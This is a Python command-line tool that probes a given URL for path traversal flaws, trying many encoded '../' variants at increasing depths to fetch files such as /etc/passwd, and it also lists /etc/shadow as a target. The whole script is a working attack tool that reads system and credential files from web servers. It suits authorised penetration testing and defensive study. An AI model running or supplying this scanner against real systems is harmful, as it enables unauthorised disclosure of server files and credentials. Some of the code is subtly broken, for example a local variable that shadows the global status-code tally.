import requests
import argparse

traversal = ["../", "%2e%2e/", ".%2e/", "%2e./", "%252e%252e/", "%252e%252e\\", "..%c0%af", "..%c1%9c", "%2e%2e%c0%af", "%252e%252e%c1%9c", "%252e%252e%c0%af"]
absolute_path = ["/var/www/html/get.php", "/var/www/html/admin/get.inc", "/etc/passwd", "/etc/shadow"]
response_codes = {}

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="target", help="Url to test")
    parser.add_argument("-d", dest="depth", help="Number of subdirectories. Default - 12")
    parser.add_argument("-f", dest="f", help="File to try to access. Default - etc/passwd")

    arguments = parser.parse_args()

    if not arguments.target:
        parser.error("[-] error: null target")

    return arguments

def print_status_codes():
    print("Done\nStatus codes:")
    for code in response_codes:
        print("[{}] - {} times".format(code, response_codes[code]))

def path_traversal(url, f, depth):
    response_codes = {}
    if url[-1] is '/':
        url = url[:-1]
    j = 0
    for t in traversal:
        if j < 6:
            path = url + t[-1]
        else:
            path = url + t[-6:]
        for i in range(int(depth)):
            path += t                
            access_test(path + f)
        j += 1
    print_status_codes()

def access_test(path):
    try:
        response = requests.get(path, headers={ 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0' }, timeout=2.5)        
        sc = response.status_code
        if sc != 403 and sc != 404 and sc != 400:
            print("\n{} - [{}]".format(path, response.status_code))
            return
        if response.status_code not in response_codes:
            response_codes[response.status_code] = 1
        else:
            response_codes[response.status_code] += 1
    except Exception as e:
        print(e)

def main():
    args = get_args()
    try:
        depth = 12 if not args.depth else args.depth
        f = "etc/passwd" if not args.f else args.f
        if f[0] is '/':
            f = f[1:]
        path_traversal(args.target, f, depth)
    except KeyboardInterrupt:
        print("\nAborted\n")

if __name__ == "__main__":
    main()
